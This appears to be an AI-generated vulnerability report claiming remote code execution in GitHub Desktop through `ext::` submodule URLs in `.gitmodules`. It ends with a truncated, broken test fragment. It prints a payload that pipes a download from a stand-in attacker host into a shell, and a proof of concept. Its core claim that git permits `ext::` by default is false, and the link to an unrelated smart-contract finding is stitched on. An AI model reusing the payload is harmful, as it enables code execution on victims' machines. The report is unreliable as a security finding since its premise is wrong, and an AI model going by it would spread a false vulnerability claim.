## Analysis

The Sherlock finding is about missing validation of critical parameters (`royaltiesAddress`, `royaltiesBps`, etc.) when a contract is *initialized* from external/untrusted input, so a single unchecked field can silently corrupt system state. The closest reachable Desktop analog is **submodule URL initialization**: when Desktop initializes/updates submodules (an operation triggered automatically by ordinary clone/pull/checkout on an attacker-controlled repository), it never validates or restricts the *transport protocol* of the submodule URLs taken from `.gitmodules`, aside from a narrow, opt-in `file://` guard. This allows an attacker-controlled `.gitmodules` entry to specify a dangerous git transport helper (e.g. `ext::`) that executes arbitrary shell commands as soon as Desktop initializes submodules.

### Title
Unvalidated submodule transport protocol allows RCE via malicious `.gitmodules` `ext::` URL - (File: app/src/lib/git/submodule.ts)

### Summary
`updateSubmodulesAfterOperation` in [1](#0-0)  runs `git submodule update --init --recursive` with no protocol allow-list, except for a caller-controlled, opt-in `protocol.file.allow=always` flag. It never restricts or validates dangerous git transport helpers such as `ext::`, which git treats as a "user"-level protocol allowed by default. Because submodule URLs are read directly out of `.gitmodules`—content fully controlled by whoever authored the cloned/fetched repository—an attacker can embed `url = ext::sh -c "..."` for a submodule and get arbitrary command execution the moment Desktop initializes submodules.

### Finding Description
`updateSubmodulesAfterOperation` builds its argument list as: [2](#0-1) 
The only protocol-related mitigation applied is the conditional `protocol.file.allow=always` flag, which is meant to *permit* local paths in specific trusted contexts (e.g. test fixtures/local forks), not to *restrict* dangerous ones. There is no `-c protocol.ext.allow=never`, no `-c protocol.fd.allow=never`, and no use of `GIT_ALLOW_PROTOCOL` to build an explicit allow-list before invoking `git submodule update --init --recursive`.

Because `.gitmodules` (and the resolved `.git/config` submodule URLs) are part of the content of a cloned/fetched repository, an attacker who controls the repository (e.g. via a malicious repo shared with the victim, a fork, or a poisoned branch) can add a submodule entry such as:
```
[submodule "evil"]
    path = evil
    url = ext::sh -c "curl http://attacker/x|sh"
```
Git's default protocol policy allows `ext::`/`fd::` helpers when the URL is supplied directly (as opposed to via an automatic redirect), which is exactly what happens when `git submodule update --init` reads the URL straight from `.gitmodules`. Desktop performs this submodule initialization automatically as part of everyday operations — clone (`git clone --recursive` in [3](#0-2) ), pull, and checkout flows (confirmed by the pull test exercising automatic submodule refresh, [4](#0-3) ) — without the user ever being asked to individually trust each submodule URL.

### Impact Explanation
This yields arbitrary command execution on the victim's machine merely from cloning, pulling, or checking out a branch of a repository that contains a crafted `.gitmodules`. This satisfies the "attacker controls a cloned/fetched repository ... result is code execution" criterion in the reported valid-impact class. No local access, admin rights, prior malware, or leaked credentials are needed — only that the victim open/clone/pull a hostile repository in Desktop, which is the normal, expected usage pattern of the application.

### Likelihood Explanation
Likelihood is high for any workflow where Desktop is used against third-party/forked/public repositories (the primary GitHub Desktop use case). Submodule initialization happens transparently as part of `--recursive` clone and subsequent pull/checkout, so no unusual user action beyond normal repository interaction is required.

### Recommendation
Explicitly restrict allowed submodule transports before invoking any `git submodule` command that can trigger a clone (`update --init`, `add`, etc.), e.g. pass `-c protocol.ext.allow=never -c protocol.fd.allow=never` (and keep `protocol.file.allow` scoped only to the specific trusted flows that currently opt into it), or set `GIT_ALLOW_PROTOCOL` in the environment used for these operations to an explicit allow-list (`http,https,ssh,git`). This should be applied uniformly across `clone`, `pull`, `checkout`, and any other path that can invoke submodule initialization on content originating from an untrusted remote.

### Proof of Concept
1. Attacker creates/forks a public repository containing a `.gitmodules` file with:
```
[submodule "evil"]
    path = evil
    url = ext::sh -c "touch /tmp/pwned"
```
2. Victim clones this repository with GitHub Desktop (`clone --recursive`, see [3](#0-2) ), or pulls/checks out a branch that adds this submodule to an already-cloned repo, triggering [5](#0-4) .
3. Git resolves the `ext::` helper for the submodule URL and executes the embedded shell command, creating `/tmp/pwned` (or any attacker payload) without further prompts.

I was not able to trace the exact call sites in `pull.ts`/`checkout.ts` (they weren't returned by search) that invoke `updateSubmodulesAfterOperation`, so I cannot cite the precise line numbers there; the pull test at [4](#0-3)  confirms automatic submodule updates occur after `pull()`, but confirming every trigger path (and whether any of them add protocol restrictions elsewhere) would require starting a Devin session with full repository access to review `app/src/lib/git/pull.ts` and `app/src/lib/git/checkout.ts` in full.

describe('git/pull', () => {
  describe('with submodules', () => {
    it('updates submodule references after pulling changes', async t => {
      // Setup: Create parent with submodule, clone it
      const { parent, submodule } = await setupRepositoryWithSubmodule(t)

      const cloned = await cloneRepository(t, parent)

      // Initialize submodules in the cloned repo
      await exec(
        ['-c', 'protocol.file.allow=always', 'submodule', 'update', '--init'],
        cloned.path
      )

      const submodulePath = Path.join(cloned.path, 'test-submodule')

      // Verify initial state
      const initialLog = await exec(['log', '--oneline'], submodulePath)
      const initialCommitCount = initialLog.stdout.trim().split('\n').length
      assert.equal(initialCommitCount, 2, 'Should start with 2 commits')

      // Add a new commit to the submodule
      await makeCommit(submodule, {
        commitMessage: 'Third commit in submodule',
        entries: [{ path: 'another-file.txt', contents: 'more content' }],
      })

      // Update the submodule reference in parent and commit
      await exec(
        ['-c', 'protocol.file.allow=always', 'submodule', 'update', '--remote'],
        parent.path
      )
      await exec(['add', 'test-submodule'], parent.path)
      await exec(['commit', '-m', 'Update submodule reference'], parent.path)

      const remote: IRemote = {
        name: 'origin',

      await pull(cloned, remote, undefined)

      // Verify submodule was updated to the new reference
      const finalLog = await exec(['log', '--oneline'], submodulePath)
